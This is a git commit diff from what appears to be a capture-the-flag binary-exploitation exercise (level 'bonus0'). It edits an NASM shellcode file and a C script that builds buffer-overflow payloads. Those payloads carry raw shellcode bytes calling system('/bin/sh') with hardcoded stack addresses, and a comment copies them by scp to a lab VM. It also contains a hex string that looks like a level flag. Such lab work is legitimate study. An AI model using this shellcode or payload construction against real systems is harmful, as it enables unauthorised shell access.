7c2474d58c951f10c03b5cd25c7ff335a28a3474
LIMachi <lee.mach.hm@gmail.com>
2024-12-09 13:00:10 +0100

    ok, this time bonus0 is REALLY finished

--- bonus0/Ressources/payload_asm.asm
+++ bonus0/Ressources/payload_asm.asm
@@ -1,6 +1,7 @@
 ;nasm -f elf32 -o payload_asm.o payload_asm.asm; objdump -d payload_asm.o
 ;final hexdump execve: (char[16]){0xbb, 0x0a, 0xf7, 0xff, 0xbf, 0x88, 0x43, 0x07, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80}
 ;final hexdump system: (char[21]){0xbb, 0x0b, 0xf7, 0xff, 0xbf, 0x53, 0x88, 0x43, 0x07, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0xcd, 0x80}
+;final hexdump system v2: (char[19]){0x68, 0x42, 0x42, 0x42, 0x42, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}
 
 section .text
 	global _start
@@ -16,15 +17,23 @@ _start:
 	;int 0x80; use the syscall
 
 	;system
-	mov ebx, 0xbffff70b; it's more compact in bytes to use the registry ebx twice (we shave 1 byte)
-	push ebx;
-	mov [ebx+7], al;
-	;push 0xbffff70b; position of bin/sh
-	;mov [0xbffff70b + 7], al; add null byte after /bin/sh
+	;mov ebx, 0xbffff70b; it's more compact in bytes to use the registry ebx twice (we shave 1 byte)
+	;push ebx
+	;mov [ebx+7], al
+	;mov eax, 0xb7e6b060; location of 'system' function
+	;call eax; absolute call using eax instead of a relative call!
+
+	;somewhat compact exit (the exit value will not be set, so most probably wont be 0)
+	;xor eax, eax
+	;inc eax
+	;int 0x80
+
+	;system v2
+	push 0x42424242; our /bin/sh will be right after this asm
 	mov eax, 0xb7e6b060; location of 'system' function
 	call eax; absolute call using eax instead of a relative call!
 
-	;somewhat compact exit (the exit value will not be set, so most probably wont be 0)
-	xor eax, eax;
-	inc eax;
-	int 0x80;
+	xor eax, eax
+	inc eax
+	xor ebx, ebx; we can use a clean exit(0) this time since we aren't limited anymore
+	int 0x80
--- bonus0/Ressources/script.c
+++ bonus0/Ressources/script.c
@@ -1,19 +1,26 @@
 #include <unistd.h>
 #include <stdio.h>
 
-//gcc script.c && ./a.out && scp -P 4242 payloadb0 bonus0@192.168.56.102:/tmp
+//gcc script.c && ./a.out && scp -P 4242 payload_b0a payload_b0b bonus0@192.168.56.102:/tmp
 //f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 int main() {
-	FILE *file = fopen("payloadb0", "w");
-	fwrite((char[21]){0xbb, 0x0b, 0xf7, 0xff, 0xbf, 0x53, 0x88, 0x43, 0x07, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0xcd, '\n'}, 1, 21, file);
-	//fclose(file);
-	//file = fopen("payload_b0b", "w");
-	fwrite((char[1]){0x80}, 1, 1, file);
-	fprintf(file, "/bin/sh0");
-	//int buffer_address = 0xbffff6f6;
-	int buffer_address = 0xbfffe670;
-	fwrite(&buffer_address, 1, 4, file);
-	fprintf(file, "\n");
+	int t_address = 0xbfffe670;
+	int offset = 80; //we wanted an offset far enough
+	int asm_address = t_address + offset;
+	int bin_sh_address = asm_address + 19; //note for it to work, we need to make sure neither asm_address nor bin_sh_address will result in \0(0x00) or \n(0x0a) characters
+
+	FILE *file = fopen("payload_b0a", "w");
+	fprintf(file, "%*c", ' ', offset);
+	fwrite((char[1]){0x68}, 1, 1, file);
+	fwrite(&bin_sh_address, 1, 4, file);
+	fwrite((char[14]){0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}, 1, 14, file);
+	fprintf(file, "/bin/sh\n");
+	fclose(file);
+
+	file = fopen("payload_b0b", "w");
+	fprintf(file, "BBBBBBBBB");
+	fwrite(&asm_address, 1, 4, file);
+	fprintf(file, "BBBBBBB\n");
 	fclose(file);
 }
